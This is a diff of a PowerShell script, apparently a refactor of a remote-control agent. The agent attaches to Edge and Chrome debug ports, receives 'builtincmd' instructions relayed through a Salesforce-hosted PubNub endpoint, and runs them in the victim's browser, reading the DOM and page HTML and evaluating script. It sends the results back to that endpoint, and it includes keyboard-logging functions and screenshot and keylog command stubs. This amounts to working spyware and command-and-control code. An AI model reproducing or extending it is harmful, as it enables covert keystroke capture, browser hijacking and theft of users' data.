@@ -171,16 +171,12 @@ function Get-KeyboardLog() {
     return $text
 }
 
-$script:msedge_debugport = 9222
-$script:chrome_debugport = 9223
-
-
 class PSCDPCommand {
     [string]$name
     [int32]$id
     [string]$method
     [hashtable]$params
-    [PSCDPResponse]$response
+    [PSCDPResult]$response
     [string]$sessionId
     [scriptblock]$callback
     [bool]$isinvoked = $false
@@ -373,7 +369,7 @@ enum PSCDPCommandErrorType {
     #>
 }
 
-class PSCDPResponse {
+class PSCDPResult {
 
     [PSCDPCommandErrorType]$errorType = [PSCDPCommandErrorType]::NoError
 
@@ -406,31 +402,19 @@ class PSCDPResponse {
         return [PSCDPCommandErrorType]::GeneralError
     }
     
-    static [PSCDPResponse] Create([hashtable]$msght) {
-        [PSCDPResponse]$obj = [PSCDPResponse]::new()
+    static [PSCDPResult] Create([hashtable]$msght) {
+        [PSCDPResult]$obj = [PSCDPResult]::new()
 
-        $terrorType = [PSCDPResponse]::GetErrorType($msght)
+        $terrorType = [PSCDPResult]::GetErrorType($msght)
 
         $obj.id = $msght['id']
 
-        try {
-            $tresult = $msght['result']
+        $tresult = $msght['result']
 
-            if ( $null -eq $tresult ) {
-                $obj.result = @{}
-            } else {
+        $obj.result = @{}
 
-                if ( $tresult -is [pscustomobject] ) {
-                    $obj.result = Transform-PSCustomObject($tresult)
-                } else {
-                    $obj.result = @{}
-                    $obj.iserror = $true
-                    $obj.errorType = [PSCDPCommandErrorType]::TransformError
-                }
-            }
-
-        } catch {
-            Log-Msg $_
+        if ( ( ! ($null -eq $tresult ) ) -and ( $tresult -is [pscustomobject] ) ) {
+            $obj.result = Transform-PSCustomObject($tresult)
         }
 
         $obj.errorType = $terrorType
@@ -583,7 +567,7 @@ $script:runtime_evaluate_callback = {
 
 $script:runtime_addBinding_callback = {
     param(
-        [PSCDPResponse]$Response, [PSCDP]$cdpobj
+        [PSCDPResult]$Response, [PSCDP]$cdpobj
     )
 
     $target = $Response.cmd.target
@@ -600,7 +584,7 @@ $script:runtime_addBinding_callback = {
 
 $script:emulation_enable_callback = {
     param(
-        [PSCDPResponse]$Response, [PSCDP]$cdpobj
+        [PSCDPResult]$Response, [PSCDP]$cdpobj
     )
 
     $target = $Response.cmd.target
@@ -711,7 +695,7 @@ $script:getTargets_callback = {
 
 $script:evaluate_callback = {
     param(
-        [PSCDPResponse]$Response, [PSCDP]$cdpobj
+        [PSCDPResult]$Response, [PSCDP]$cdpobj
     )
 
     $cmd = $Response.cmd.builtincmd
@@ -786,7 +770,7 @@ $script:GetTargetHTML_callback = {
 
 $script:getdom_callback = {
     param(
-        [PSCDPResponse]$Response, [PSCDP]$cdpobj
+        [PSCDPResult]$Response, [PSCDP]$cdpobj
     )
 
     $obj = $Response.result.root
@@ -1059,9 +1043,8 @@ function Send-ChunkedResult {
 
 }
 
-# TODO move logic to external funcs for each cmd
 function Process-BuiltInCommand {
-    param([object]$cmd)
+    param([hashtable]$cmd)
 
     $resultout = @{
         builtincmd=$cmd.builtincmd
@@ -1186,7 +1169,7 @@ function Process-BuiltInCommand {
 
         return
     } elseif ( $cmd.builtincmd -eq "SendTestMessage" ) {
-        $result = "message received"
+        $result = "message received -- $(Get-Timestamp)"
     } elseif ( $cmd.builtincmd -eq "GetClientCommands" ) {
 
         $result = $script:clientws.commands | ForEach-Object { 
@@ -1221,6 +1204,10 @@ function Process-BuiltInCommand {
         $script:clientws.AddQueue( $pbmsg )
 
         return
+    } elseif ( $cmd.builtincmd -eq "GetScreenshot" ) {
+        throw 'fatal error: not implemented'
+    } elseif ( $cmd.builtincmd -eq "GetKeyboardLog" ) {
+        throw 'fatal error: not implemented'
     } else {
         throw "unsupported command [$($cmd.builtincmd)]"
     }
@@ -1228,12 +1215,9 @@ function Process-BuiltInCommand {
     $resultout['result'] = $result
 
     $script:pubnubws.SendPBMessage($resultout)
-
-    # GetScreenshot  --> send back image as base64 string --> requires chunking
-    # GetKeyboardLog --> send back owdkeyboardlog.txt file --> might also require chunking
 }
 
-# executes builtincmd
+# WARN only supports pb messages with builtincmd payload
 function Process-PubNubEvent {
 
     param([string]$Message)
@@ -1251,14 +1235,20 @@ function Process-PubNubEvent {
 
     }
 
+    try {
+        if ( [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
+            return
+        }
+    } catch {
+        return
+    }
+
     $cmd = $null
 
-    if ( ! [string]::IsNullOrEmpty($payload.message.builtincmd) ) {
-        $cmd = $payload.message
+    $cmd = $payload.message
 
-        if ( $null -ne $cmd ) {
-            Process-BuiltInCommand($cmd)
-        }
+    if ( $null -ne $cmd ) {
+        Process-BuiltInCommand($cmd)
     }
 
 }
@@ -1309,14 +1299,18 @@ class PSCDP {
     $wsUri = $null
     $websocket = $null
 
+    [string]$wsname = $null
+
     # TODO cleanup and refactor using PSCDP<...> types
     $sendQueue = [System.Collections.Concurrent.BlockingCollection[PSCDPCommand]]::new()
     $responses = [System.Collections.Generic.List[object]]::new()
+    
+    $broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $broadcastresponses = [System.Collections.Generic.List[object]]::new()
     $broadcasterrors = [System.Collections.Generic.List[object]]::new()
+    
     $commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
-    $broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
     $results = [System.Collections.Generic.List[object]]::new()
     $errors = [System.Collections.Generic.List[object]]::new() 
     $pubnubmsgs = [System.Collections.Generic.List[object]]::new()
@@ -1334,50 +1328,6 @@ class PSCDP {
     $totalbytecount = 0
     $result = $null
 
-
-    [void] Reset() {
-        $this.wsUri = $null
-        $this.websocket = $null
-    
-        $this.sendQueue = [System.Collections.Concurrent.BlockingCollection[object]]::new()
-        $this.responses = [System.Collections.Generic.List[object]]::new()
-        $this.broadcastresponses = [System.Collections.Generic.List[object]]::new()
-        $this.broadcasterrors = [System.Collections.Generic.List[object]]::new()
-        $this.commands = [System.Collections.Generic.List[PSCDPCommand]]::new()
-        $this.broadcasts = [System.Collections.Generic.List[PSCDPCommand]]::new()
-        $this.results = [System.Collections.Generic.List[object]]::new()
-        $this.errors = [System.Collections.Generic.List[object]]::new() 
-        $this.pubnubmsgs = [System.Collections.Generic.List[object]]::new()
-        $this.callbackcmds = [System.Collections.Generic.List[PSCDPCommand]]::new()
-        $this.targets = [System.Collections.Generic.List[PSCDPTarget]]::new()
-
-        $this.messageId = 1
-        $this.receiveNew = $true
-        $this.byteArray = $null
-        $this.segment = $true
-        $this.task = $true
-        $this.memoryStream = [System.IO.MemoryStream]::new()
-        $this.totalbytecount = 0
-        $this.result = $null
-        $this.pubnubTarget = $null
-    }
-
-    [void] CheckSocket() {
-
-        if ( $this.IsSocketHealthy() ) {
-            return
-        }
-
-        if ( $null -eq $this.webSocket ) {
-            throw "websocket is null"
-        }
-
-        if ( ! $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) {
-            throw 'websocket is not open'
-        }
-        
-    }
-
     [bool] IsSocketHealthy() {
         if ( ( ! $null -eq $this.webSocket ) -and ( $this.webSocket.State -eq [System.Net.WebSockets.WebSocketState]::Open ) ) {
             return $true
@@ -1393,9 +1343,10 @@ class PSCDP {
         $this.debugport = $debugport
     }
 
-    PSCDP($debugport, $pubnuburl) {
+    PSCDP($debugport, $pubnuburl, $wsname) {
         $this.debugport = $debugport
         $this.pubnuburl = $pubnuburl
+        $this.wsname = $wsname
     }
 
     [System.Uri] GetWSUrI() {
@@ -1461,7 +1412,6 @@ class PSCDP {
     
         $this.websocket = New-Object System.Net.WebSockets.ClientWebSocket
 
-
         $connectTask = $this.websocket.ConnectAsync($this.wsUri, [System.Threading.CancellationToken]::None)
 
         if ( $null -eq $this.websocket) {
@@ -1516,7 +1466,7 @@ class PSCDP {
         return $this.GetResultByCmd($cmd)
     }
 
-    [object] GetResultByCmd([PSCDPCommand]$cmd) { #TODO refactor to return PSCDPResponse object
+    [object] GetResultByCmd([PSCDPCommand]$cmd) { #TODO refactor to return PSCDPResult object
         try {
             $id = $cmd.id
 
@@ -1542,7 +1492,7 @@ class PSCDP {
         return $null
     }
 
-    [object] GetResult([string]$cmdname) { #TODO refactor to return PSCDPResponse object
+    [object] GetResult([string]$cmdname) { #TODO refactor to return PSCDPResult object
 
         $cmd = $this.GetCommand($cmdname)
 
@@ -1555,12 +1505,9 @@ class PSCDP {
 
     [PSCDPCommand] SendCdpCommand([PSCDPCommand]$cmd) {
         
-        if ( $null -eq $this.websocket ) {
-            throw "websocket is null"
-        }
-
-        if ($this.websocket.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
-            throw "Cannot send command. WebSocket is not Open (State: $($this.websocket.State))"
+        # anchor
+        if ( $null -eq $this.IsSocketHealthy() ) {
+            throw "websocket is not healthy"
         }
 
         if ( $null -eq $cmd ) {
@@ -1581,11 +1528,7 @@ class PSCDP {
     
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
         $buffer = New-Object System.ArraySegment[byte] -ArgumentList @(,$bytes)
-    
-        if (! $this.websocket.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
-            throw "web socket is not open"
-        }
-    
+        
         $sendTask = $this.websocket.SendAsync($buffer, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None)
         
         if ( $null -ne $sendTask ) {
@@ -1710,7 +1653,7 @@ class PSCDP {
         }
 
         try {
-            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResponse
+            $msg = $json | ConvertFrom-Json # TODO refactor to use PSCDPResult
         } catch {
             Log-Msg $_ # TODO refactor to report exception
             return
@@ -1776,21 +1719,19 @@ class PSCDP {
             $this.errors.Add($msght)
         }
 
-        # check if msg is a response to an issued cmd
+        # check if msg is a result from issued cmd
         if ( $isresult ) {
             $cmd = $this.GetCommandByID($msg.id)
             
-            # convert msght to PSCDPResponse before attaching
+            # convert msght to PSCDPResult before attaching
 
             if ( $null -ne $cmd ) {
-                $cmd.response = [PSCDPResponse]::Create($msght)
+                $cmd.response = [PSCDPResult]::Create($msght)
                 $cmd.response.cmd = $cmd
                 $cmd.iserror = $iserror
             }
 
             $msght.Add('cmd', $cmd)
-
-            $this.results.Add($msght)
         }
 
         if ( $bindingCalled ) {
@@ -1897,8 +1838,6 @@ class PSCDP {
         if ( $this.sendQueue.IsCompleted -or ( $this.sendQueue.Count -le 0 ) ) {
             return
         }
-
-        Log-Msg ( "sending cmd -- cmds count: " + $this.sendQueue.Count )
         
         $cmd = $this.sendQueue.Take()
 
@@ -1917,11 +1856,10 @@ class PSCDP {
         $cmd = $this.SendCdpCommand($cmd)
     }
 
-    # TODO refactor so that only commands with pending callback is being traversed
     [void] ExecCallbacks() {
 
-        for ( $i = 0; $i -lt $this.commands.Count; $i++) {
-            $cmd = $this.commands[$i]
+        for ( $i = 0; $i -lt $this.callbackcmds.Count; $i++) {
+            $cmd = $this.callbackcmds[$i]
 
             if ( $cmd.HasCallback() -and ( ! $cmd.isinvoked ) -and ( $null -ne $cmd.response) ) {
                 $cmd.callback.Invoke($cmd.response,$this)
@@ -2014,35 +1952,35 @@ class PSCDP {
     }
 
     [void] LogState() {
-        try {
-            $msgstrs = @()
-            $msgstrs += "sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count)"
-            $msgstrs += "results: $($this.results.Count) errors: $($this.errors.Count) pubnub messages: $($this.pubnubmsgs.Count)"
-            $msgstrs += "broadcasts sent: $($this.broadcasts.Count) broadcasts received: $($this.broadcastresponses.Count) broadcast errors: $($this.broadcasterrors.Count)"
+        $msgstrs = @()
+        $msgstrs += "[$($this.wsname)]"
+        $msgstrs += "sendQueue: $($this.sendQueue.Count) commands: $($this.commands.Count) responses: $($this.responses.Count)"
+        $msgstrs += "results: $($this.results.Count) errors: $($this.errors.Count) pb messages: $($this.pubnubmsgs.Count)"
+        $msgstrs += "broadcasts sent: $($this.broadcasts.Count) broadcasts received: $($this.broadcastresponses.Count) broadcast errors: $($this.broadcasterrors.Count)"
+        
+        if ( $null -ne $this.pubnubTarget) {
             $msgstrs += "console.log: $($this.pubnubTarget.console_log_check)"
             $msgstrs += "addbinding_ok: $($this.pubnubTarget.addbinding_ok)"
             $msgstrs += "executionContextId: $($this.pubnubTarget.executionContextId)"
-            $msgstr = $msgstrs -join " "
-            Log-Msg "system state --  $msgstr"
-        } catch {
-            Log-Msg $_
-        }        
+        }
+
+        $msgstr = $msgstrs -join " "
+        Log-Msg $msgstr
     }
 
 }
 
+$script:msedge_debugport = 9222
+$script:chrome_debugport = 9223
+
 $script:pubnuburl = "https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub"
 $clientport = $script:chrome_debugport
 $pubnubport = $script:msedge_debugport
-# TODO check both 9222 and 9223 and figure out which one points to pubnub browser
-# pubnub is whichever browser is holding a target that points to $pubnuburl
-# client is a browser that has an active target and no target pointing to pubnuburl -- if no client found, 
-# delay and try again
 
-$script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl)
+$script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl, "pubnubws")
 $script:pubnubws.ConnectCdp()
 
-$script:clientws = [PSCDP]::new($clientport)
+$script:clientws = [PSCDP]::new($clientport, $null, "clientws")
 $script:clientws.ConnectCdp()
 
 $keyboardlogger = {
@@ -2063,47 +2001,42 @@ $n = 50
 $i = 0
 while ( $true ) {
 
-    # ! need to implement cmd to reset all memory as responses/cmds might take up too much space
-
     Log-Msg "new iteration -- $i/$n"
 
     try {
-        $script:pubnubws.LogState() # TODO need to check if pubnub connection is active
+        $script:pubnubws.LogState()
 
-        # TODO reset the connection if pubnub broadcasts are not going through -- after 5 messages
+        $socketok = $script:pubnubws.IsSocketHealthy()
 
-        $script:pubnubws.CheckSocket()
+        # anchor
+        if ( ! $socketok ) {
+            Log-Msg "socket not ok -- reconnecting"
+            $script:pubnubws = [PSCDP]::new($pubnubport, $pubnuburl, "pubnubws")
+            $script:pubnubws.ConnectCdp()
+        } else {
 
-        $script:pubnubws.InitReceive()
-        $script:pubnubws.ReadMessage()
-        $script:pubnubws.EndMessage()
+            $script:pubnubws.InitReceive()
+            $script:pubnubws.ReadMessage()
+            $script:pubnubws.EndMessage()
 
-        $script:pubnubws.ExecCallbacks()
-        $script:pubnubws.NextCmd()    
+            $script:pubnubws.ExecCallbacks()
+            $script:pubnubws.NextCmd()    
 
-        if ( $i -ge $n ) {
-            $script:pubnubws.Broadcast()
-            # need to check if target pointing to pubnub url is active
-            # if not, create target, reset, etc.
-            $i=0
+            if ( $i -ge $n ) {
+                $script:pubnubws.Broadcast()
+                $i=0
+            }
         }
-    
-    } catch [PSCDPException]  {
-        if ( $_.Exception.ispubnubnull ) {
-            Log-Msg $_
-        }
+
     } catch {
         Log-Msg $_
-
-        $script:pubnubws.Reset()
-        $script:pubnubws.ConnectCdp()
     }
 
 
     try {
         $script:clientws.LogState()
 
-        $script:clientws.CheckSocket()
+        $socketok = $script:clientws.IsSocketHealthy()
 
         $script:clientws.InitReceive()
         $script:clientws.ReadMessage()
